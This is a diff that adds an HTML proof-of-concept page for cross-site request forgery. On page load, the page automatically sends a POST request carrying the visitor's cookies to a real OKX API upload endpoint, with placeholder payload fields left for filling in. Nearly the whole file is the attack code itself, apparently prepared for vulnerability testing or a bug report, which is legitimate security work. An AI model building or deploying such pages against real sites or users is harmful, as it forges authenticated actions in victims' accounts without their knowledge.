@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CSRF PoC</title>
+    <script>
+        function sendPostRequest() {
+            const url = "https://www.okx.com/priapi/v3/growth/crm/upload"; // Your target URL
+            const data = {
+                // Replace with your payload data
+                key1: "value1",
+                key2: "value2",
+                // Add more fields as needed
+            };
+
+            fetch(url, {
+                method: "POST",
+                body: JSON.stringify(data), // Payload
+                mode: "cors", // Enable CORS for cross-origin requests
+                credentials: "include" // Include credentials (cookies, authorization headers)
+            })
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error('Network response was not ok: ' + response.statusText);
+                }
+                return response.json();
+            })
+            .then(data => {
+                console.log('Success:', data);
+            })
+            .catch((error) => {
+                console.error('Error:', error);
+            });
+        }
+    </script>
+</head>
+<body onload="sendPostRequest()">
+    <h1>CSRF Proof of Concept</h1>
+    <p>The POST request will be sent automatically on page load.</p>
+</body>
+</html>
